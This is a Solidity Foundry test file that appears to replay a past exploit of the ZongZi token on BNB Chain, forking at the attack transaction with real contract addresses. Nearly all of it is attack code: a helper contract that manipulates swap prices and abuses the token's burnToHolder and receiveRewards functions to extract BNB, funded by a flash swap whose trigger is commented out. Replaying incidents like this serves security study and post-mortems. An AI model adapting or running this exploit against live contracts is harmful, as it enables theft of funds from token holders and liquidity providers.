// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../../src/interface/interface.sol";

contract ContractTest is Test {
    IWETH private constant WBNB =
        IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZongZi =
        IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    Uni_Pair_V2 private constant BUSDT_WBNB =
        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 private constant WBNB_ZONGZI =
        Uni_Pair_V2(0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant attackContract =
        0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9;
    bytes32 private constant attackTx =
        hex"247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f";

    function setUp() public {
        vm.createSelectFork("bsc", attackTx);
    }

    function testExploit() public {
        console2.log("WBNB: ", WBNB.balanceOf(address(this)));
        uint256 pairWBNBBlance = WBNB.balanceOf(address(WBNB_ZONGZI));
        console.log("--- ~ testExploit ~ pairWBNBBlance:", pairWBNBBlance);
        uint256 multiplier = uint256(
            vm.load(attackContract, bytes32(uint256(9)))
        );
        console.log("--- ~ testExploit ~ multiplier:", multiplier);
        uint256 amount1Out = (pairWBNBBlance * multiplier) /
            ((pairWBNBBlance * 100) / address(ZongZi).balance);
        console.log(
            "--- ~ testExploit ~ amount1Out:",
            amount1Out,
            BUSDT_WBNB.balanceOf(address(this))
        );
        //BUSDT_WBNB.swap(0, 1e18, address(this), abi.encode(uint8(1)));
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) public {
        console2.log("--- ~ pancakeCall:", sender, amount0, amount1);
        Helper helper = new Helper();
        console2.log("--- ~ helper:", address(helper), amount1);
        WBNB.transfer(address(helper), amount1);
        helper.exploit();
        console2.log("aaaaa");

        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(WBNB);
        ZongZi.approve(address(Router), type(uint256).max);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZongZi.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        console2.log(
            "WBNB: ",
            WBNB.balanceOf(address(this)),
            BUSDT_WBNB.balanceOf(address(this))
        );
        WBNB.transfer(address(BUSDT_WBNB), (amount1 * 10026) / 10000);
        console2.log(
            "WBNB2: ",
            WBNB.balanceOf(address(this)),
            BUSDT_WBNB.balanceOf(address(this))
        );
    }
}

interface IZZF is IERC20 {
    function burnToHolder(uint256 amount, address invitation) external;

    function receiveRewards(address to) external;
}

contract Helper {
    IWETH private constant WBNB =
        IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZongZi =
        IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    IZZF private constant ZZF =
        IZZF(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    receive() external payable {}

    function exploit() external {
        console2.log("exploit: ", WBNB.balanceOf(address(Router)));

        WBNB.approve(address(Router), type(uint256).max);
        ZongZi.approve(address(Router), type(uint256).max);
        console2.log("WBNB: ", WBNB.balanceOf(address(this)));
        makeSwap(1e17, address(WBNB), address(ZongZi));
        makeSwap(
            ZongZi.balanceOf(address(this)),
            address(ZongZi),
            address(WBNB)
        );
        uint256 amountIn = WBNB.balanceOf(address(this)) - 1e17;
        console2.log("--- ~ exploit ~ amountIn:", amountIn);
        makeSwap(amountIn, address(WBNB), address(ZongZi));
        uint256 amountOut = address(ZongZi).balance - 1e9;
        console2.log("--- ~ exploit ~ amountOut:", amountOut);
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(WBNB);
        uint256[] memory amounts = Router.getAmountsIn(amountOut, path);
        console2.log("--- ~ exploit ~ amounts:", amounts.length);
        ZZF.burnToHolder(amounts[0], msg.sender);
        ZZF.receiveRewards(address(this));
        makeSwap(
            ZongZi.balanceOf(address(this)),
            address(ZongZi),
            address(WBNB)
        );
        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
    }

    function makeSwap(
        uint256 amountIn,
        address tokenA,
        address tokenB
    ) private {
        console2.log("makeSwap");
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 100
        );
    }
}
